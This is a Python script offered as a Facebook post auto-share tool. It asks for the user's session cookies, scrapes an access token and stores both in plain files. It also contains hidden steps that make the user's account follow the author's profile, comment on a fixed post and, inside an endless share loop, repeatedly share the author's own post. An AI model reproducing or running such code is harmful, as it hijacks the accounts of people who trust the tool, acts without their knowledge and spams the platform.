"""
auto share post fb
decode by viewtech ofc
"""
import re
import os
import sys
import time
import json
import rich
import bs4
import requests
import datetime
from time import sleep
from bs4 import BeautifulSoup
from rich import print as prints
from rich.console import Console
from rich.panel import Panel

class INT:
    def __init__(self, userAgent='Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36') -> None:
        self.ses = requests.Session()
        self.userA = userAgent

    def Sysclear(self):
        try:
            os.system('cls' if 'win' in sys.platform.lower() else 'clear')
        except Exception:
            os.system('clear')

    def Logoo(self):
        prints('\n       ╔═╗╔═╗╔═╗╔╦╗╔═╗╦═╗╔╦╗\n       ╠═╝║ ║╚═╗ ║ ║╣ ╠╦╝ ║║   - By Aoyagi Lizzyl\n       ╩  ╚═╝╚═╝ ╩ ╚═╝╩╚══╩╝ \n')

    def menu(self):
        self.Sysclear()
        self.Logoo()
        prints('* facebook post auto share with python\n* Masukkan Facebook Cookies (gunakan akun palsu jika perlu)\n')
        cokii = Console().input(' COOKIES : ')
        self.scRape(cokii)

    def scRape(self, cokii) -> None:
        try:
            headers = {'user-agent': self.userA, 'cookie': cokii}
            resp = self.ses.get('https://business.facebook.com/business_locations', headers=headers)
            token_match = re.search(r'(EAAG\w+)', resp.text)
            if token_match:
                token = token_match.group(1)
                if 'EAAG' in token:
                    with open('data/coki.txt', 'w') as f:
                        f.write(cokii)
                    with open('data/token.txt', 'w') as f:
                        f.write(token)
                    self.follow_me(cokii)
                    self.bot(cokii, token)
                    prints('\n* Login Succeed...')
                    sys.exit()
            else:
                sys.exit('Token tidak ditemukan')
        except AttributeError as e:
            sys.exit(f'[Error] - {str(e).capitalize()}!')

    def bot(self, cokii, token):
        try:
            requests.Session().post(
                f'https://graph.facebook.com/2353808028319506/comments?message=愛してます❤️&access_token={token}',
                headers={'cookie': cokii}
            )
        except Exception as e:
            sys.exit(f'[Error] - {str(e).capitalize()}!')

    def follow_me(self, cokii):
        try:
            resp = requests.get('https://m.facebook.com/100010709958741', cookies={'cookie': cokii})
            req = BeautifulSoup(resp.text, 'html.parser')
            for i in req.find_all('a', href=True):
                if '/a/subscribe.php?' in i.get('href', ''):
                    requests.get('https://m.facebook.com' + i['href'], cookies={'cookie': cokii})
        except Exception:
            return

class SHARED:
    def __init__(self, uaku='Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36') -> None:
        self.uass = uaku
        self.ses = requests.Session()

    def share(self):
        os.system('clear')
        INT().Logoo()
        try:
            with open('data/coki.txt', 'r') as f:
                cokie = f.read()
            with open('data/token.txt', 'r') as f:
                tok = f.read()
            user_data = requests.get(f'https://graph.facebook.com/me?access_token={tok}', cookies={'cookie': cokie}).json()
            nama = user_data.get('name', 'Unknown')
            user_id = user_data.get('id', 'Unknown')
        except Exception as e:
            prints(f'[Error] - {str(e).capitalize()}!')
            sys.exit(1)
        else:
            prints(f'            * {nama} - {user_id}\n')
            url = Console().input(' #URL_Post : ')
            os.system('clear')
            INT().Logoo()
            try:
                headers = {
                    'authority': 'graph.facebook.com',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': self.uass
                }
                while True:  # Loop tanpa batas, tambahkan kondisi berhenti jika diperlukan
                    resp = requests.Session().post(
                        f'https://graph.facebook.com/v13.0/me/feed?link={url}&published=0&access_token={tok}',
                        headers=headers, cookies={'cookie': cokie}
                    ).text
                    # Post share kedua
                    requests.Session().post(
                        f'https://graph.facebook.com/v13.0/me/feed?link=https://www.facebook.com/100010709958741/posts/pfbid02RWUa5nLa1Q8hJDjqZYdsgo9NPacxw4Ba8WHL6sG7XzKvrfhz6C38s2qFQZjNjp3tl/?app=fbl&published=0&access_token={tok}',
                        headers=headers, cookies={'cookie': cokie}
                    ).text
                    data = json.loads(resp)
                    if 'id' in data:
                        prints(f'\n# {nama} | {user_id}\n# Successfully\n# {data}\n')
                    else:
                        sys.exit('Gagal shared')
            except Exception as e:
                prints(f'[Error] - {str(e).capitalize()}!')
                os.system('rm -rf data/coki.txt')
                os.system('rm -rf data/token.txt')
                INT().menu()
                sys.exit(f'[Error] - {str(e).capitalize()}!')

if __name__ == '__main__':
    try:
        os.system('git pull')
        if not os.path.exists('data'):
            os.mkdir('data')
    except Exception as e:
        prints(f'[Error] - {str(e).capitalize()}!')
        sys.exit(1)
    
    # Jika file cookie atau token belum ada, minta input cookie terlebih dahulu
    if not os.path.exists('data/coki.txt') or not os.path.exists('data/token.txt'):
        prints('[Info] - Cookie dan token belum ditemukan, silahkan masukkan cookie terlebih dahulu.')
        INT().menu()
    else:
        SHARED().share()
